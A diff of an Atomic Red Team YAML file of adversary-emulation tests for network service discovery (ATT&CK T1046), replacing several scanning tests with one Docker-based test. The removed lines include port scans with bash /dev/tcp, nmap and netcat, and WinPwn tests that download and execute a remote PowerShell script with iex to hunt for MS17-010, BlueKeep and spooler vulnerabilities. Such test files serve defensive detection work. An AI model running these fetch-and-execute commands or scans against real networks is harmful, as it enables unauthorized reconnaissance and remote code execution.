@@ -1,168 +1,30 @@
 attack_technique: T1046
-display_name: Network Service Scanning
+display_name: "Network Service Discovery"
 atomic_tests:
-- name: Port Scan
-  auto_generated_guid: 68e907da-2539-48f6-9fc9-257a78c05540
-  description: |
-    Scan ports to check for listening ports.
-
-    Upon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.
+- name: Network Service Discovery
+  auto_generated_guid:
+  description: Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.
   supported_platforms:
-  - linux
-  - macos
-  input_arguments:
-    host:
-      description: Host to scan.
-      type: string
-      default: 192.168.1.1
-  executor:
-    command: |
-      for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
-    name: bash
-- name: Port Scan Nmap
-  auto_generated_guid: 515942b0-a09f-4163-a7bb-22fefb6f185f
-  description: |
-    Scan ports to check for listening ports with Nmap.
-
-    Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.
-  supported_platforms:
-  - linux
-  - macos
-  input_arguments:
-    host:
-      description: Host to scan.
-      type: string
-      default: 192.168.1.1
-    port:
-      description: Ports to scan.
-      type: string
-      default: "80"
-    network_range:
-      description: Network Range to Scan.
-      type: string
-      default: 192.168.1.0/24
+  - containers
   dependency_executor_name: sh
   dependencies:
-  - description: |
-      Check if nmap command exists on the machine
+  - description: Verify docker is installed.
     prereq_command: |
-      if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1; fi;
+      which docker
     get_prereq_command: |
-      (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)
-  - description: |
-      Check if nc command exists on the machine
+      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
+
+  - description: Verify docker service is running.
     prereq_command: |
-      if [ -x "$(command -v nc)" ]; then exit 0; else exit 1; fi;
+      sudo systemctl status docker  --no-pager
     get_prereq_command: |
-      (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)
-  - description: |
-      Check if telnet command exists on the machine
-    prereq_command: |
-      if [ -x "$(command -v telnet)" ]; then exit 0; else exit 1; fi;
-    get_prereq_command: |
-      (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)
+      sudo systemctl start docker
   executor:
-    command: |
-      sudo nmap -sS #{network_range} -p #{port}
-      telnet #{host} #{port}
-      nc -nv #{host} #{port}
+    command: |-
+      docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/
+      docker run --name t1046_container  -d -t t1046
+      docker exec t1046_container ./test.sh
+    cleanup_command: |-
+      docker stop t1046_container
+      docker rmi -f t1046
     name: sh
-    elevation_required: true
-- name: Port Scan NMap for Windows
-  auto_generated_guid: d696a3cb-d7a8-4976-8eb5-5af4abf2e3df
-  description: Scan ports to check for listening ports for the local host 127.0.0.1
-  supported_platforms:
-  - windows
-  input_arguments:
-    nmap_url:
-      description: NMap installer download URL
-      type: url
-      default: https://nmap.org/dist/nmap-7.80-setup.exe
-    host_to_scan:
-      description: The host to scan with NMap
-      type: string
-      default: 127.0.0.1
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      NMap must be installed
-    prereq_command: 'if (cmd /c "nmap 2>nul") {exit 0} else {exit 1}'
-    get_prereq_command: |
-      Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
-      Start-Process $env:temp\nmap-7.80-setup.exe /S
-  executor:
-    command: |-
-      nmap #{host_to_scan}
-    name: powershell
-    elevation_required: true
-- name: Port Scan using python
-  auto_generated_guid: 6ca45b04-9f15-4424-b9d3-84a217285a5c
-  description: |
-    Scan ports to check for listening ports with python
-  supported_platforms:
-  - windows
-  input_arguments:
-    host_ip:
-      description: Host to scan.
-      type: string
-      default: 127.0.0.1
-    filename:
-      description: Location of the project file
-      type: path
-      default: PathToAtomicsFolder\T1046\src\T1046.py
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Check if python exists on the machine
-    prereq_command: |
-      if (python --version) {exit 0} else {exit 1}
-    get_prereq_command: |
-      echo "Python 3 must be installed manually"
-  executor:
-    command: |
-      python #{filename} -i #{host_ip}
-    name: powershell
-- name: WinPwn - spoolvulnscan
-  auto_generated_guid: 54574908-f1de-4356-9021-8053dd57439a
-  description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
-  supported_platforms:
-  - windows
-  executor:
-    command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-      spoolvulnscan -noninteractive -consoleoutput
-    name: powershell
-- name: WinPwn - MS17-10
-  auto_generated_guid: 97585b04-5be2-40e9-8c31-82157b8af2d6
-  description: Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn
-  supported_platforms:
-  - windows
-  executor:
-    command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-      MS17-10 -noninteractive -consoleoutput
-    name: powershell
-- name: WinPwn - bluekeep
-  auto_generated_guid: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
-  description: Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).
-  supported_platforms:
-  - windows
-  executor:
-    command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-      bluekeep -noninteractive -consoleoutput
-    name: powershell
-- name: WinPwn - fruit
-  auto_generated_guid: bb037826-cbe8-4a41-93ea-b94059d6bb98
-  description: Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn
-  supported_platforms:
-  - windows
-  executor:
-    command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-      fruit -noninteractive -consoleoutput
-    name: powershell
